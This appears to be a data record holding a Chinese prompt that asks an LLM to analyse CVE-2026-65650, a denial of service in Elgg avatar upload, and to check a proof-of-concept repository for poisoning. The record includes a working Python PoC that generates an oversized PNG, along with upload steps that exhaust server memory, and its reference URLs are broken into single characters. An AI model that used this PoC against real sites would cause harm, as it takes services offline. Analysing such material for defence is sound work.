    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-65650\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"Elgg before 7.0.0 does not check image dimensions to prevent denial of service via a large avatar upload.\", \"\\u6807\\u9898: Elgg \\u5934\\u50cf\\u4e0a\\u4f20\\u56fe\\u50cf\\u5904\\u7406\\u62d2\\u7edd\\u670d\\u52a1\\u6f0f\\u6d1e\"], \"published_date\": \"2026-07-22T18:17:06.047\", \"last_modified_date\": \"2026-07-22T20:50:36.493\", \"cvss_score\": 4.3, \"severity\": \"MEDIUM\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"E\", \"l\", \"g\", \"g\", \"/\", \"E\", \"l\", \"g\", \"g\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"a\", \"b\", \"9\", \"1\", \"d\", \"5\", \"9\", \"d\", \"c\", \"2\", \"c\", \"a\", \"a\", \"a\", \"3\", \"f\", \"d\", \"b\", \"f\", \"e\", \"7\", \"e\", \"9\", \"b\", \"9\", \"1\", \"6\", \"f\", \"c\", \"0\", \"c\", \"c\", \"7\", \"e\", \"6\", \"b\", \"3\", \"2\", \"3\", \"a\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"E\", \"l\", \"g\", \"g\", \"/\", \"E\", \"l\", \"g\", \"g\", \"/\", \"c\", \"o\", \"m\", \"p\", \"a\", \"r\", \"e\", \"/\", \"7\", \".\", \"0\", \".\", \"0\", \"-\", \"r\", \"c\", \".\", \"1\", \".\", \".\", \".\", \"7\", \".\", \"0\", \".\", \"0\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"E\", \"l\", \"g\", \"g\", \"/\", \"E\", \"l\", \"g\", \"g\", \"/\", \"p\", \"u\", \"l\", \"l\", \"/\", \"1\", \"5\", \"0\", \"4\", \"1\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - SecureWithUmer/CVE-2026-PoCs: A community-curated ...\n [description] Jul 8, 2026 · CVE-2026-PoCs A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026.\n [link] https://github.com/SecureWithUmer/CVE-2026-PoCs\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - ctkqiang/CVE-Exploits: 一个收集各种CVE漏洞的PoC（概念验...\n [description] Jan 8, 2026 · 一个收集各种CVE漏洞的PoC（概念验证）或Exploit（漏洞利用）工具的仓库。旨在为安全研究、渗透测试提供参考和便利 ...\n [link] https://github.com/ctkqiang/CVE-Exploits\n [webpage 1 end]\n[webpage 2 begin] [title] Exploit Database - Exploits for Penetration Testers ...\n [description] The Exploit Database - Exploits, Shellcode, 0days, Remote Exploits, Local Exploits, Web Apps, Vulnerability Reports, Security Articles, Tutorials and more.\n [link] https://www.exploit-db.com/\n [webpage 2 end]\n[webpage 3 begin] [title] 2026 年高危漏洞 TOP10 盘点与修复实战指南 | CN-SEC 中文网\n [description] Apr 9, 2026 · 2026年第一季度披露1,847个高危漏洞，其中CVSS9.0+达156个，涵盖操作系统、数据库等核心基础设施。 本文深度解析TOP10高危漏洞技术细节，提供POC复现步骤与企业级修复方案，助力安全团队快速响应风险。\n [link] https://cn-sec.com/archives/5160140.html\n [webpage 3 end]\n[webpage 4 begin] [title] CVE: Common Vulnerabilities and Exposures\n [description] At cve.org, we provide the authoritative reference method for publicly known information-security vulnerabilities and exposures\n [link] https://www.cve.org/\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/83925a8603056ab39eb78d453d17e399/CVE-2026-65650.py\n---\n#!/usr/bin/env python3\n\"\"\"\nReal pixel flood PoC — actual image data, not a header trick.\nGD must allocate real memory to process this.\n\"\"\"\nfrom PIL import Image\nimport os\n\nwidth  = 10000\nheight = 10000\n\n# Create real image with actual pixel data\nimg = Image.new('RGB', (width, height), color=(255, 0, 0))\nimg.save('CVE-2026-65650.png', format='PNG', compress_level=9)\n\nsize = os.path.getsize('CVE-2026-65650.png')\nmem  = (width * height * 3) / (1024 * 1024)\n\nprint(f\"[+] Created CVE-2026-65650.png\")\nprint(f\"    Dimensions  : {width}x{height}\")\nprint(f\"    File size   : {size/1024:.1f} KB\")\nprint(f\"    Memory GD needs to decode : ~{mem:.0f} MB\")\nprint(f\"    Memory GD needs to resize : ~{mem*2:.0f} MB (src + dst buffer)\")\n\n\n---\n/tmp/83925a8603056ab39eb78d453d17e399/README.md\n---\n# CVE-2026-65650 — PoC: Authenticated DoS in Elgg Avatar Upload\n\nAuthenticated denial of service in Elgg's avatar upload feature via unbounded image dimensions, causing GD memory exhaustion.\n\n- **Affected:** Elgg `< 6.3.5` (6.x line), and `7.0.0-rc.1 – < 7.0.0` (7.0 release candidates)\n- **Fixed:** Elgg `6.3.5`, `7.0.0`\n- **CVE:** [CVE-2026-65650](https://www.cve.org/CVERecord?id=CVE-2026-65650)\n\n## Root Cause\n\n`actions/avatar/upload.php` passes uploaded images straight into `saveIconFromUploadedFile()` with no dimension, size, or memory guard:\n\n```php\n$avatar = elgg_get_uploaded_file('avatar', false);\n\n// No dimension check.\n// No size check.\n// No ratio check.\nif (!$owner->saveIconFromUploadedFile('avatar')) {\n    return elgg_error_response(elgg_echo('avatar:resize:fail'));\n}\n```\n\nPHP's GD library allocates memory based on an image's decoded pixel dimensions, not its on-disk file size. A small file with extreme dimensions therefore forces a huge allocation the moment GD touches it.\n\n## Steps To Reproduce\n\nStep 1 — `python3 CVE-2026-65650.py`\n\nStep 2 — Log in as any registered user.\n\nStep 3 — Navigate to **Profile > Edit Avatar** and upload `CVE-2026-65650.png`.\n\n## Result\n\nRunning the PoC forces GD to allocate ~286 MB to decode the image and ~572 MB more to resize it, despite the file itself being ~308 KB on disk. On a 14 GB / no-swap test box, a single upload dropped available memory to ~1.3 GB. On memory-constrained deployments this is enough to trigger a kernel OOM kill of PHP-FPM workers, taking the site down with no self-recovery.\n\nA single request from a single low-privileged account is enough to drive this consumption. Repeated or concurrent requests from multiple accounts compound the effect and increase the likelihood of hitting OOM.\n\n## Fix\n\nFixed in Elgg 7.0.0 and backported to 6.3.5.\n\n- PR: [Elgg/Elgg#15041](https://github.com/Elgg/Elgg/pull/15041)\n- Commit: https://github.com/Elgg/Elgg/commit/ab91d59dc2caaa3fdbfe7e9b916fc0cc7e6b323a\n\n\n---\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
